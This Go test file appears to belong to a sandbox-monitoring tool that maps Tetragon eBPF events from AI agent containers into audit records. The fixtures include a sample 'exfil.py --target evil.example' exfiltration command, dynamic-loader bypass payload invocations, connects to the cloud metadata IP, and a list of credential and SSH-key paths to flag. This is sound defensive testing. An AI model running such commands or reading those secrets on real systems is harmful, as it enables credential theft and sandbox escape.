// Copyright 2025 The Wardyn Authors
// SPDX-License-Identifier: Apache-2.0

package groundtruth

import (
	"encoding/json"
	"testing"

	"github.com/google/uuid"

	"github.com/cjohnstoniv/wardyn/internal/types"
)

// fakeCorrelator maps a fixed set of container ids to run ids.
type fakeCorrelator struct {
	byContainer map[string]uuid.UUID
}

func (f fakeCorrelator) RunForContainer(id string) (uuid.UUID, bool) {
	r, ok := f.byContainer[id]
	return r, ok
}

var (
	knownRun       = uuid.MustParse("11111111-1111-1111-1111-111111111111")
	knownContainer = "abc123def456"
	knownCgroup    = uint64(987654) // no longer used for correlation; still exercised as opaque EventData.CgroupID
)

func mappedCorrelator() fakeCorrelator {
	return fakeCorrelator{
		byContainer: map[string]uuid.UUID{knownContainer: knownRun},
	}
}

// decodeData unmarshals an event's Data into EventData for assertions.
func decodeData(t *testing.T, ev types.AuditEvent) EventData {
	t.Helper()
	var d EventData
	if err := json.Unmarshal(ev.Data, &d); err != nil {
		t.Fatalf("decode data: %v (raw=%s)", err, ev.Data)
	}
	return d
}

func TestIsDynamicLinker(t *testing.T) {
	cases := []struct {
		bin  string
		want bool
	}{
		{"/lib/ld-linux.so.2", true},
		{"/lib64/ld-linux-x86-64.so.2", true},
		{"/lib32/ld-linux.so.2", true},
		{"/usr/lib/ld-linux-aarch64.so.1", true},
		{"/lib/ld-musl-x86_64.so.1", true},
		{"/usr/lib/ld-musl-aarch64.so.1", true},
		{"ld-linux-x86-64.so.2", true}, // bare basename
		{"ld-musl-x86_64.so.1", true},  // bare basename
		{"/usr/bin/python3", false},
		{"/bin/sh", false},
		{"/usr/local/bin/curl", false},
		{"", false},
		{"   ", false},
		{"/usr/bin/ldd", false}, // not a loader despite the prefix
	}
	for _, c := range cases {
		if got := IsDynamicLinker(c.bin); got != c.want {
			t.Errorf("IsDynamicLinker(%q) = %v, want %v", c.bin, got, c.want)
		}
	}
}

func TestIsSensitivePath(t *testing.T) {
	cases := []struct {
		path string
		want bool
	}{
		{"/home/agent/.ssh/id_rsa", true},
		{"/root/.ssh/authorized_keys", true},
		{"/etc/passwd", true},
		{"/etc/shadow", true},
		{"/home/user/.aws/credentials", true},
		{"/home/user/.config/gcloud/access_tokens.db", true},
		{"/home/user/.kube/config", true},
		{"/workspace/repo/.git/config", true},
		{"/home/agent/.gitconfig", true},
		{"/home/agent/.git-credentials", true},
		{"/home/agent/.netrc", true},
		{"/home/agent/.npmrc", true},
		{"/var/run/secrets/kubernetes.io/serviceaccount/token", true},
		{"/run/secrets/my-secret", true},
		{"/opt/keys/server.pem", true},
		{"/opt/app/tls.key", true},
		{"/home/agent/service-account.json", true},
		{"/home/agent/.docker/config.json", true},
		// Non-sensitive (filtered).
		{"/tmp/build.log", false},
		{"/workspace/repo/main.go", false},
		{"/home/agent/output.txt", false},
		{"/usr/share/doc/readme", false},
		{"", false},
		{"   ", false},
	}
	for _, c := range cases {
		if got := IsSensitivePath(c.path); got != c.want {
			t.Errorf("IsSensitivePath(%q) = %v, want %v", c.path, got, c.want)
		}
	}
}

func TestMapProcessExec(t *testing.T) {
	m := NewMapper(mappedCorrelator())

	// Sample Tetragon JSON for a mapped, ordinary exec.
	line := []byte(`{
		"process_exec": {
			"process": {
				"binary": "/usr/bin/python3",
				"arguments": "exfil.py --target evil.example",
				"docker": "abc123def456",
				"cgroup_id": 987654,
				"pod": null
			},
			"parent": {"binary": "/bin/bash"}
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected exec to map")
	}
	if ev.Action != ActionProcessExec {
		t.Errorf("action = %q, want %q", ev.Action, ActionProcessExec)
	}
	if ev.ActorType != types.ActorSystem || ev.Actor != SensorActor {
		t.Errorf("actor = %s/%s, want system/%s", ev.ActorType, ev.Actor, SensorActor)
	}
	if ev.RunID == nil || *ev.RunID != knownRun {
		t.Errorf("run id = %v, want %v", ev.RunID, knownRun)
	}
	if ev.Target != "/usr/bin/python3" {
		t.Errorf("target = %q, want the binary", ev.Target)
	}
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Stream != Stream {
		t.Errorf("stream = %q, want %q", d.Stream, Stream)
	}
	if d.Subtype != SubtypeProcessExec {
		t.Errorf("subtype = %q, want %q", d.Subtype, SubtypeProcessExec)
	}
	if d.Correlation != CorrelationMapped {
		t.Errorf("correlation = %q, want mapped", d.Correlation)
	}
	if d.Loader {
		t.Error("python3 should not be flagged as a loader")
	}
	wantArgv := []string{"/usr/bin/python3", "exfil.py", "--target", "evil.example"}
	if len(d.Argv) != len(wantArgv) {
		t.Fatalf("argv = %v, want %v", d.Argv, wantArgv)
	}
	for i := range wantArgv {
		if d.Argv[i] != wantArgv[i] {
			t.Errorf("argv[%d] = %q, want %q", i, d.Argv[i], wantArgv[i])
		}
	}
	if d.CgroupID != knownCgroup {
		t.Errorf("cgroup_id = %d, want %d", d.CgroupID, knownCgroup)
	}
	if d.ContainerID != knownContainer {
		t.Errorf("container_id = %q, want %q", d.ContainerID, knownContainer)
	}
}

func TestMapProcessExec_LoaderFlag(t *testing.T) {
	m := NewMapper(mappedCorrelator())

	// The ld-linux/mmap bypass: invoking the loader directly to run a payload
	// the execve hook never named. We must FLAG it (loader=true), not block it.
	line := []byte(`{
		"process_exec": {
			"process": {
				"binary": "/lib64/ld-linux-x86-64.so.2",
				"arguments": "./payload",
				"docker": "abc123def456",
				"cgroup_id": 987654
			}
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected loader exec to map")
	}
	d := decodeData(t, ev)
	if !d.Loader {
		t.Error("ld-linux exec must be flagged loader=true (ld-linux/mmap bypass surface)")
	}
	// Loader exec is still recorded with success outcome (detection, not block).
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success (we detect, never block)", ev.Outcome)
	}
}

func TestMapProcessExec_LoaderInArgv(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// Loader invoked by basename as argv[0] via a wrapper. Flag it too.
	line := []byte(`{
		"process_exec": {
			"process": {
				"binary": "/bin/sh",
				"arguments": "-c ld-musl-x86_64.so.1 ./payload",
				"docker": "abc123def456"
			}
		}
	}`)
	ev, _ := m.MapLine(line)
	d := decodeData(t, ev)
	// argv[0] is /bin/sh; the loader is deeper. We only flag argv[0]/binary, so
	// this stays false — documenting the limit: a shell-wrapped loader is not
	// caught by the argv[0] heuristic (the binary field is authoritative).
	if d.Loader {
		t.Error("shell-wrapped loader is not flagged via argv[0] heuristic (documented limit)")
	}
}

// TestMapNetworkConnect covers the DOCUMENTED Tetragon export shape for a TCP
// connect. Tetragon has NO top-level "process_connect" event kind (the
// GetEventsResponse oneof is process_exec / process_exit / process_kprobe /
// process_tracepoint / process_uprobe / process_lsm / ...). A connect is
// observed via a process_kprobe on a connect kprobe (tcp_connect /
// security_socket_connect / __sys_connect) whose socket argument is a sock_arg
// (KprobeSock) with daddr/dport. Keying off a fictional kind meant live
// escape/connect detection never fired (the finding this regression locks down).
func TestMapNetworkConnect(t *testing.T) {
	m := NewMapper(mappedCorrelator())

	// Ordinary outbound connect (public IP) via a tcp_connect kprobe.
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/curl", "docker": "abc123def456", "cgroup_id": 987654},
			"function_name": "tcp_connect",
			"args": [{"sock_arg": {"family": "AF_INET", "protocol": "IPPROTO_TCP", "saddr": "172.17.0.2", "daddr": "93.184.216.34", "sport": 51000, "dport": 443}}]
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected connect to map")
	}
	if ev.Action != ActionNetworkConnect {
		t.Errorf("action = %q, want %q", ev.Action, ActionNetworkConnect)
	}
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success for a public dst", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Dst != "93.184.216.34:443" {
		t.Errorf("dst = %q, want 93.184.216.34:443 (from sock_arg daddr/dport)", d.Dst)
	}
	if d.Subtype != SubtypeNetworkConnect {
		t.Errorf("subtype = %q, want %q", d.Subtype, SubtypeNetworkConnect)
	}
}

// TestMapNetworkConnect_Kind covers every connect-hook function name the mapper
// recognises, against the documented sock_arg shape.
func TestMapNetworkConnect_Kind(t *testing.T) {
	for _, fn := range []string{"tcp_connect", "security_socket_connect", "__sys_connect", "__x64_sys_connect", "sys_connect"} {
		t.Run(fn, func(t *testing.T) {
			m := NewMapper(mappedCorrelator())
			line := []byte(`{
				"process_kprobe": {
					"process": {"binary": "/usr/bin/curl", "docker": "abc123def456"},
					"function_name": "` + fn + `",
					"args": [{"sock_arg": {"daddr": "93.184.216.34", "dport": 443}}]
				}
			}`)
			ev, ok := m.MapLine(line)
			if !ok {
				t.Fatalf("expected connect kprobe (%s) to map", fn)
			}
			if ev.Action != ActionNetworkConnect {
				t.Errorf("action = %q, want %q", ev.Action, ActionNetworkConnect)
			}
			if decodeData(t, ev).Dst != "93.184.216.34:443" {
				t.Errorf("dst = %q, want 93.184.216.34:443", decodeData(t, ev).Dst)
			}
		})
	}
}

func TestMapNetworkConnect_MetadataIsFailure(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// A connect to the cloud metadata IP is an escape signal -> outcome failure.
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/curl", "docker": "abc123def456"},
			"function_name": "security_socket_connect",
			"args": [{"sock_arg": {"daddr": "169.254.169.254", "dport": 80}}]
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected connect to map")
	}
	if ev.Outcome != "failure" {
		t.Errorf("outcome = %q, want failure for metadata IP", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Dst != "169.254.169.254:80" {
		t.Errorf("dst = %q, want metadata addr", d.Dst)
	}
}

// TestMapNetworkConnect_PrivateProxyIsNotFailure locks down FIX #17: under the
// primary L0 topology (Internal + gatewayless) the agent's SOLE legal dst is
// wardyn-proxy on a PRIVATE bridge IP. The old mapper stamped any private dst
// "failure" via an IP-class guess, so every legitimate agent->proxy connect was
// a false escape alert. A private dst must now map to "success" (the connect
// happened; downstream policy — not this target-agnostic mapper — decides).
func TestMapNetworkConnect_PrivateProxyIsNotFailure(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/curl", "docker": "abc123def456"},
			"function_name": "tcp_connect",
			"args": [{"sock_arg": {"daddr": "172.18.0.2", "dport": 8080}}]
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected connect to map")
	}
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success for the private proxy dst (not a false escape flag)", ev.Outcome)
	}
	if d := decodeData(t, ev); d.Dst != "172.18.0.2:8080" {
		t.Errorf("dst = %q, want 172.18.0.2:8080", d.Dst)
	}
}

func TestMapFileWrite_Sensitive(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// A write to ~/.ssh via a security_file_permission kprobe.
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/python3", "docker": "abc123def456", "cgroup_id": 987654},
			"function_name": "security_file_permission",
			"args": [{"file_arg": {"path": "/home/agent/.ssh/id_rsa"}}]
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("expected sensitive file write to map")
	}
	if ev.Action != ActionFileWrite {
		t.Errorf("action = %q, want %q", ev.Action, ActionFileWrite)
	}
	d := decodeData(t, ev)
	if d.Path != "/home/agent/.ssh/id_rsa" {
		t.Errorf("path = %q, want the ssh key path", d.Path)
	}
	if d.Subtype != SubtypeFileWrite {
		t.Errorf("subtype = %q, want %q", d.Subtype, SubtypeFileWrite)
	}
	if ev.Target != "/home/agent/.ssh/id_rsa" {
		t.Errorf("target = %q, want the path", ev.Target)
	}
}

func TestMapFileWrite_NonSensitiveFiltered(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// A write to an ordinary file is FILTERED (ok=false): noise, not signal.
	line := []byte(`{
		"process_kprobe": {
			"process": {"binary": "/usr/bin/python3", "docker": "abc123def456"},
			"function_name": "security_file_permission",
			"args": [{"file_arg": {"path": "/workspace/repo/main.go"}}]
		}
	}`)
	if _, ok := m.MapLine(line); ok {
		t.Error("non-sensitive write should be filtered (ok=false)")
	}
}

func TestMapFileWrite_PathArgAndStringArg(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// path_arg shape.
	ev, ok := m.MapLine([]byte(`{
		"process_kprobe": {
			"process": {"docker": "abc123def456"},
			"args": [{"path_arg": {"path": "/etc/sudoers"}}]
		}
	}`))
	if !ok || decodeData(t, ev).Path != "/etc/sudoers" {
		t.Errorf("path_arg shape not handled: ok=%v ev=%+v", ok, ev)
	}
	// string_arg shape.
	ev, ok = m.MapLine([]byte(`{
		"process_kprobe": {
			"process": {"docker": "abc123def456"},
			"args": [{"string_arg": "/root/.aws/credentials"}]
		}
	}`))
	if !ok || decodeData(t, ev).Path != "/root/.aws/credentials" {
		t.Errorf("string_arg shape not handled: ok=%v ev=%+v", ok, ev)
	}
}

func TestMapUnmapped_RunIDNull(t *testing.T) {
	// A container the correlator does not know -> run_id NULL, unmapped, never
	// silently dropped (ok stays true). Blindness must be visible.
	m := NewMapper(mappedCorrelator())
	line := []byte(`{
		"process_exec": {
			"process": {"binary": "/usr/bin/wget", "docker": "UNKNOWNcontainer", "cgroup_id": 555}
		}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("unmapped event must STILL be emitted (visible blindness), not dropped")
	}
	if ev.RunID != nil {
		t.Errorf("run id = %v, want nil for unmapped", ev.RunID)
	}
	d := decodeData(t, ev)
	if d.Correlation != CorrelationUnmapped {
		t.Errorf("correlation = %q, want unmapped", d.Correlation)
	}
}

func TestMapUnmapped_NilCorrelator(t *testing.T) {
	// A nil Correlator must not panic; everything is unmapped.
	m := NewMapper(nil)
	ev, ok := m.MapLine([]byte(`{"process_exec":{"process":{"binary":"/bin/sh","docker":"x"}}}`))
	if !ok {
		t.Fatal("expected emit with nil correlator")
	}
	if ev.RunID != nil {
		t.Errorf("run id = %v, want nil with nil correlator", ev.RunID)
	}
	if decodeData(t, ev).Correlation != CorrelationUnmapped {
		t.Error("want unmapped with nil correlator")
	}
}

func TestMapUnmapped_CgroupOnlyNoLongerCorrelates(t *testing.T) {
	// Container-id correlation is the sole (authoritative) path: a process with
	// no docker id is unmapped even when its cgroup id would have resolved
	// under the removed cgroup-fallback index.
	m := NewMapper(mappedCorrelator())
	line := []byte(`{
		"process_exec": {"process": {"binary": "/bin/sh", "cgroup_id": 987654}}
	}`)
	ev, ok := m.MapLine(line)
	if !ok {
		t.Fatal("unmapped event must still be emitted (visible blindness), not dropped")
	}
	if ev.RunID != nil {
		t.Errorf("run id = %v, want nil (cgroup-only no longer correlates)", ev.RunID)
	}
	if decodeData(t, ev).Correlation != CorrelationUnmapped {
		t.Error("want unmapped for a cgroup-only process")
	}
}

func TestMapUnknownKind(t *testing.T) {
	m := NewMapper(mappedCorrelator())
	// A Tetragon event kind we do not record -> ok=false.
	if _, ok := m.MapLine([]byte(`{"process_exit": {"process": {"binary": "/bin/sh"}}}`)); ok {
		t.Error("unknown event kind should not map (ok=false)")
	}
	// Garbage JSON -> ok=false, no panic.
	if _, ok := m.MapLine([]byte(`{not json`)); ok {
		t.Error("garbage JSON should not map")
	}
	// Empty event.
	if _, ok := m.MapLine([]byte(`{}`)); ok {
		t.Error("empty event should not map")
	}
}

func TestHeartbeatEvent(t *testing.T) {
	ev := HeartbeatEvent()
	if ev.Action != ActionSensorHeartbeat {
		t.Errorf("action = %q, want %q", ev.Action, ActionSensorHeartbeat)
	}
	if ev.RunID != nil {
		t.Errorf("heartbeat run id = %v, want nil (host-scoped)", ev.RunID)
	}
	if ev.ActorType != types.ActorSystem || ev.Actor != SensorActor {
		t.Errorf("actor = %s/%s, want system/%s", ev.ActorType, ev.Actor, SensorActor)
	}
	if ev.Outcome != "success" {
		t.Errorf("outcome = %q, want success", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Stream != Stream {
		t.Errorf("stream = %q, want ebpf", d.Stream)
	}
}

func TestBlindEvent(t *testing.T) {
	ev := BlindEvent(knownRun, "")
	if ev.Action != ActionSensorBlind {
		t.Errorf("action = %q, want %q", ev.Action, ActionSensorBlind)
	}
	if ev.RunID == nil || *ev.RunID != knownRun {
		t.Errorf("blind run id = %v, want %v (gap is attributable)", ev.RunID, knownRun)
	}
	if ev.Outcome != "failure" {
		t.Errorf("outcome = %q, want failure (coverage gap is degraded)", ev.Outcome)
	}
	d := decodeData(t, ev)
	if d.Reason != "cc3-kata-host-ebpf-blind" {
		t.Errorf("reason = %q, want default cc3-kata-host-ebpf-blind", d.Reason)
	}
}

func TestAllActionsHaveKernelPrefix(t *testing.T) {
	// Invariant the control-plane endpoint enforces: every action this stream
	// emits carries the kernel. prefix.
	actions := []string{
		ActionProcessExec, ActionNetworkConnect, ActionFileWrite,
		ActionSensorHeartbeat, ActionSensorBlind,
	}
	for _, a := range actions {
		if len(a) < len(KernelActionPrefix) || a[:len(KernelActionPrefix)] != KernelActionPrefix {
			t.Errorf("action %q lacks the %q prefix", a, KernelActionPrefix)
		}
	}
}
